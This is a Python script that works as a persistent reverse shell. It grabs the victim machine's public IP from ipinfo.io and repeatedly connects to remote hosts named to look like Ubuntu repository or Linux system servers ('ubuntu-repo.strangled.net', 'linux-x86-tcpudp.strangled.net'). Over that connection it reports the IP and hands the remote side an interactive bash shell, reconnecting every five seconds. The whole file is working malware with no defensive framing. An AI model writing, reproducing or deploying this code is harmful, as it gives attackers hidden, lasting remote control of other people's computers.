import socket
import os
import pty
import select
import subprocess
import time
import urllib.request
import json
import sys

LOCKFILE = "/tmp/cached_script.lock"

def check_and_acquire_lock():
    if os.path.exists(LOCKFILE):
        try:
            with open(LOCKFILE, "r") as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            sys.exit(0)
        except (OSError, ValueError):
            pass

    try:
        with open(LOCKFILE, "w") as f:
            f.write(str(os.getpid()))
    except:
        pass

def remove_lock():
    try:
        if os.path.exists(LOCKFILE):
            os.remove(LOCKFILE)
    except:
        pass

def main():
    check_and_acquire_lock()
    
    true_ip = "Unknown IP"
    try:
        req = urllib.request.Request(
            "http://ipinfo.io", 
            headers={'User-Agent': 'curl/7.68.0'}
        )
        with urllib.request.urlopen(req, timeout=4) as response:
            true_ip = json.loads(response.read().decode()).get("ip", "Unknown IP")
    except:
        pass

    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            try:
                s.connect(("ubuntu-repo.strangled.net", 8090))
            except Exception:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("linux-x86-tcpudp.strangled.net", 21))
            
            s.send(f"{true_ip}\n".encode())
            
            # THE INTERACTION FIX: Force unbuffered system environment variables 
            # to break any terminal stream-caching deadlocks natively!
            env_vars = os.environ.copy()
            env_vars["PYTHONUNBUFFERED"] = "1"
            env_vars["TERM"] = "xterm-256color"
            
            master, slave = os.openpty()
            
            # Force target bash to turn on immediate character flushes via unbuffered python execution
            p = subprocess.Popen(
                ["/bin/bash", "-i"], 
                stdin=slave, stdout=slave, stderr=slave, 
                preexec_fn=os.setsid,
                env=env_vars
            )
            os.close(slave)

            # Set the master pty descriptor to non-blocking to prevent stream-lock freezing
            try:
                import fcntl
                fl = fcntl.fcntl(master, fcntl.F_GETFL)
                fcntl.fcntl(master, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            except:
                pass

            while p.poll() is None:
                r, w, x = select.select([s, master], [], [], 5)
                if not r:
                    try:
                        s.send(b"\x00") 
                    except:
                        break
                    continue

                for fd in r:
                    if fd == s:
                        data = s.recv(4096)
                        if not data: 
                            break
                        os.write(master, data)
                    elif fd == master:
                        try:
                            data = os.read(master, 4096)
                            if not data: 
                                break
                            s.send(data)
                        except OSError:
                            pass # Safely bypass transient non-blocking data delays
                else:
                    continue
                break
                
            try:
                p.terminate()
                p.wait(timeout=2)
            except:
                pass
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            
        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    finally:
        remove_lock()
